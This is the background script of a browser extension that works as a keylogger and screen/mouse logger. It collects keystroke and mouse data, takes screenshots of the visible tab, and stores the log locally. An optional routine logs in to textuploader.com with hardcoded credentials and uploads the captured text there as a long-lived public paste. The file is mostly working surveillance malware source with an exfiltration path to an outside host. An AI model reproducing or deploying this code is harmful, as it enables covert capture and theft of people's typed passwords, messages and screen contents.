"use strict";

var concatenated="";
let mouse_coord={};
let mouse_json = {};
var ms=100000;
var netupload=false;
var shift_register=0;
var register_max=9; //log every 30 seconds or whenever a key is pressed
var username="my_username";
var password="my_password";

/**
 * Returns all of the registered extension commands for this extension
 * and their shortcut (if active).
 *
 * Since there is only one registered command in this sample extension,
 * the returned `commandsArray` will look like the following:
 *    [{
 *       name: "toggle-feature",
 *       description: "Send a 'toggle-feature' event to the extension"
 *       shortcut: "Ctrl+Shift+U"
 *    }]
 */

var gettingAllCommands = chrome.commands.getAll(function(commands) {
		for (let command of commands) {
			console.log(command);
		}
});

/**
 * Fired when a registered command is activated using a keyboard shortcut.
 *
 * In this sample extension, there is only one registered command: "Alt+Ctrl+k".
 */
chrome.commands.onCommand.addListener((command) => {
	if (command=="display-log0"||command=="display-log1") {
		setTimeout(present_log, 100);
  	}
  	if (command=="erase-log0"||command=="erase-log1") {
    		let setting = chrome.storage.local.set({storedkl: ""});
  	}
});

chrome.runtime.onMessage.addListener(msg => {
	var ID = function () {
		return '_' + Math.random().toString(36).substr(2, 9);
	  };
	if(msg.action=="keylog") {
    		console.log(concatenated);
	}
	if(msg.action == "mouselog") {
			let splitted = msg.data.split(':');
			mouse_coord[splitted[0]] = splitted[1];
			console.log(msg.data)
			if(splitted[1].charAt(0) === '[') {
				let id = ID();
				mouse_json[id] = mouse_coord;
				mouse_coord = {};
				concatenated += JSON.stringify(mouse_json, null, 4);
			}
			chrome.tabs.captureVisibleTab(
				null,
				{},
				function(dataUrl)
				{
					console.log(dataUrl);
				}
			);
	}

	if(msg.action == 'erreur') {
		console.error(msg.data);
	}

	if(msg.action == "imglog") {
		console.log(msg.data);
	}
});

if(netupload==true) {
	tokenlogin();
	setInterval(logtimestamp, 3000);
	setInterval(logupload, 60000);
}

setInterval(logtimestamp, 3000);

function dateToString(date) {
	let month = date.getMonth() + 1;
	let day = date.getDate();
	let dateOfString = (("" + day).length < 2 ? "0" : "") + day + "/";
	dateOfString += (("" + month).length < 2 ? "0" : "") + month + "/";
	dateOfString += date.getFullYear();
	let hour = date.getHours();
	let minute = date.getMinutes();
	let second = date.getSeconds();
	dateOfString += " " + (("" + hour).length < 2 ? "0" : "") + hour + ":";
	dateOfString += (("" + minute).length < 2 ? "0" : "") + minute + ":";
	dateOfString += (("" + second).length < 2 ? "0" : "") + second;
	
	return dateOfString;
}

function forwardtocontent() {
	let gettingItem = chrome.storage.local.get('storedkl', function(result) {
			if (result.storedkl == null) {
     				result.storedkl="";
			}
			chrome.runtime.sendMessage({action: "keylog-data", data: result.storedkl + concatenated});
	});
}

function logtimestamp() {
	if(concatenated.length<1){
		shift_register=shift_register+1;
		if(shift_register>register_max) {
			shift_register=0;
		}
    	} else {
		shift_register=0;
	}
	if(concatenated.length<1&&shift_register!=1){
		return;
	}
	

	//let currentdate = new Date();
	//let datetime="";
	let mystoredkl="";
	//datetime += dateToString(currentdate);
	//datetime = "timestamp: " + datetime;

	let gettingItem = chrome.storage.local.get('storedkl', function(result) {
			if (result.storedkl == null) {
     				result.storedkl="";
			}
			mystoredkl=result.storedkl + concatenated;
			let a = mystoredkl.length;
			if(a > ms) {
				mystoredkl=mystoredkl.substring(a-ms);
				mystoredkl=mystoredkl.substring(ms/100);
			}
			let setting = chrome.storage.local.set({storedkl: mystoredkl});
			concatenated="";
	});
}

function logupload() {
	if(concatenated=="") {
		return;
	}	
	// upload log to txtuploader
	var req = new XMLHttpRequest();
	var url = "http://textuploader.com";
	req.open("POST", url, true);
	req.withCredentials = true;

	req.onload = function () {
	    // do something to response
	    console.log(this.responseText);
	};
	req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");	
	req.send("textdata=" + encodeURIComponent(concatenated) + "&texttitle=code&expiration=9999999&syntax=auto&type=public");
	req.onload = function () {
	    // do something to response
	    console.log(this.responseText);
	};
	// concatenated="";
}

function tokenlogin() {
    var req = new XMLHttpRequest();

    var token="";
    
    var url = "https://textuploader.com/auth/logout";

    req.open("GET", url, true);
    req.withCredentials = true;
    req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req.send(null);

    var req = new XMLHttpRequest();

    var url = "https://textuploader.com/auth/login";

    req.open("GET", url, false);
    // req.withCredentials = true;
    // req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req.onload = function(e) {
        console.log(req.responseText);
        token = req.responseText;
        var posun = token.indexOf("_token");
        var posdeux = token.indexOf("value=");
        var postroi = token.indexOf("> ");
        token = token.substring(posdeux + 7,postroi-1);
        txtuploadrlogin(token);
    }
    req.send(null);
}

function txtuploadrlogin(token) {    
	//login to txtuploader
	var req = new XMLHttpRequest();
	var url = "https://textuploader.com/auth/login";
    
	req.open("POST", url, true);

	req.withCredentials = true;

	req.onload = function () {
	    // do something to response
	    console.log(this.responseText);
	};
        
	req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  
	req.send("_token=" + encodeURIComponent(token) + "&username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password) + "&submit=Login");
	return;
}

function onError(error) {
	console.log(`Error: ${error}`);
}

function present_log() {
	//read the contents of the log
	let win=chrome.tabs.create({url: chrome.extension.getURL('./index.html')}, function(tab) {
		setTimeout(forwardtocontent, 100);
	});
}




